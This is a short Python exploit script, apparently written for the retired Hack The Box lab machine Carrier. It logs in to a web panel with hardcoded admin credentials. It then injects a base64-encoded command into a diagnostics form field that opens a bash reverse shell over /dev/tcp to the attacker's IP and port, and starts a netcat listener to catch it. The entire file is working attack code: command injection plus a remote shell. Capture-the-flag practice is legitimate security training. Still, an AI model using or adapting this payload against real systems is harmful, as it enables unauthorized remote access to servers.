#!/usr/bin/python

"""
A script to get a reverse shell on Hack The Box retired machine - Carrier.
Write-up : https://0xrick.github.io/hack-the-box/carrier/
usage : ./shell.py [ip adress] [port]
"""
import requests
import sys
import subprocess
import base64

base_url = "http://10.10.10.105"
diag_url = "http://10.10.10.105/diag.php"
session = requests.session()
login_data = {"username" : "admin" , "password" : "NET_45JDX23"}
payload = base64.b64encode("root && bash -i >& /dev/tcp/" + sys.argv[1] + "/" + sys.argv[2] + " 0>&1")
shell_data = {"check" : payload}

session.post(base_url , data=login_data)
subprocess.Popen(["nc","-lvnp",sys.argv[2]])
session.post(diag_url , data=shell_data)
